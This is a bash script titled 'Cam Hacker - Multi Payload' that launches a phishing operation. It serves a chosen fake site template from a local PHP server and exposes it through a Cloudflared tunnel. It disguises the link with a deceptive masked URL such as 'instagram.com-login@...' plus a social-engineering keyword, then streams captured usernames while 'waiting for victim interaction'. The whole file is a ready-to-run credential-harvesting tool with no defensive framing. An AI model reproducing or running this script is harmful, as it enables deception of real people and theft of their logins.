#!/bin/bash

SERVER_DIR=".server/www"
PORT=8080

RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"
RESET="\033[0m"

function banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║       Cam Hacker - Multi Payload      ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
}

function check_internet() {
    echo -e "${CYAN}[i] Checking internet connection...${RESET}"
    wget -q --spider https://google.com
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] No internet connection. Exiting.${RESET}"
        exit 1
    fi
}

function check_cloudflared() {
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${CYAN}[*] Cloudflared not found. Installing...${RESET}"
        wget -O cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x cloudflared
        sudo mv cloudflared /usr/local/bin/
    fi
}

function choose_site() {
    echo -e "${CYAN}📂 Available Templates:${RESET}"
    SITE_DIRS=()
    index=1

    for dir in sites/*/; do
        site_name=$(basename "$dir")
        echo -e "[$index] ${site_name//_/ }"
        SITE_DIRS+=("$dir")
        ((index++))
    done

    read -p $'\nChoose a site template by number: ' choice
    if [[ "$choice" =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#SITE_DIRS[@]} ]]; then
        SITE_DIR="${SITE_DIRS[$((choice - 1))]}"
        echo -e "${GREEN}[+] Selected template: ${SITE_DIR}${RESET}"
    else
        echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
        exit 1
    fi
}

function start_php_server() {
    mkdir -p $SERVER_DIR
    rm -rf $SERVER_DIR/*
    cp -r $SITE_DIR/* $SERVER_DIR/
    cd $SERVER_DIR && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    echo -e "${GREEN}[+] PHP server started at http://127.0.0.1:$PORT${RESET}"
}

function mask_url() {
    echo -ne "${CYAN}[?] Do you want to change Mask URL? [y/N]: ${RESET}"
    read choice
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        read -p "[+] Enter a custom domain to mask (e.g., https://instagram.com-login): " custom
        read -p "[+] Enter a social engineering keyword (e.g., free-access): " keyword
        echo -e "${GREEN}[+] Masked URL: $custom@$URL/$keyword${RESET}"
    else
        echo -e "${GREEN}[+] Direct URL: $URL${RESET}"
    fi
}

function start_cloudflared() {
    echo -e "${GREEN}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel -url http://127.0.0.1:$PORT > ../cloudflared.log 2>&1 &
    sleep 6
    URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ../cloudflared.log | head -n 1)
    if [[ $URL ]]; then
        mask_url
    else
        echo -e "${RED}[!] Failed to get Cloudflared URL. Make sure it's installed.${RESET}"
        exit 1
    fi
    echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
    echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
    tail -f $SERVER_DIR/usernames.txt 2>/dev/null &
    while true; do sleep 1; done
}

# Execution starts here
banner
check_internet
check_cloudflared
choose_site

echo -e "${CYAN}Choose tunneling option:${RESET}"
echo "[1] Localhost"
echo "[2] Cloudflared"
read -p $'Your choice: ' tunnel

start_php_server

if [[ $tunnel == 1 ]]; then
    echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
    echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
    tail -f $SERVER_DIR/usernames.txt 2>/dev/null &
    while true; do sleep 1; done
elif [[ $tunnel == 2 ]]; then
    start_cloudflared
else
    echo -e "${RED}[!] Invalid tunneling option.${RESET}"
    exit 1
fi
